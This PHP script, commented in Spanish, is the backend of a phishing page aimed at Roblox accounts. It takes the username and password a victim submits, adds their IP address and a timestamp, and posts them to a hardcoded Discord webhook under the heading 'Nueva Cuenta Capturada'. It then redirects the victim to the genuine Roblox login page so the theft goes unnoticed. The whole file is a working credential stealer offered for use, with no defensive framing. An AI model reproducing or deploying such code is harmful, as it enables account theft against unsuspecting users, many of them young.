<?php
// --- CONFIGURACIÓN DE LA WEBHOOK ---
// Reemplaza 'AQUI_TU_WEBHOOK_URL' con la URL real que obtuviste de Discord.
$webhook_url = 'https://discord.com/api/webhooks/1454818452404703284/H7YbiPBINkBHb_tryXz0le-8q8YU8SGTOqGljvPSy0W7dM_6baLupZlIbAcmqZedpK6A';

// --- DATOS DEL FORMULARIO ---
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

// --- PREPARACIÓN DEL MENSAJE PARA DISCORD ---
// Discord usa "embeds" para mensajes con formato enriquecido.
$embed_data = [
    'title' => '🚨 Nueva Cuenta Capturada 🚨',
    'color' => 16711680, // Color rojo en decimal
    'fields' => [
        [
            'name' => 'Usuario',
            'value' => $username,
            'inline' => true
        ],
        [
            'name' => 'Contraseña',
            'value' => $password,
            'inline' => true
        ],
        [
            'name' => 'Dirección IP',
            'value' => $ip,
            'inline' => false
        ],
        [
            'name' => 'Fecha de Captura',
            'value' => $date,
            'inline' => false
        ]
    ],
    'footer' => [
        'text' => 'Logger de Cuentas'
    ]
];

// El payload completo que se enviará a Discord
$post_data = json_encode(['embeds' => [$embed_data]]);

// --- ENVÍO DE LA SOLICITUD A DISCORD ---
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($post_data)
]);

// Ejecutar la solicitud y cerrar la conexión
$response = curl_exec($ch);
curl_close($ch);

// --- REDIRECCIÓN DEL USUARIO ---
// Después de enviar los datos, redirige al usuario a la página oficial de Roblox.
header('Location: https://www.roblox.com/login');
exit();
?>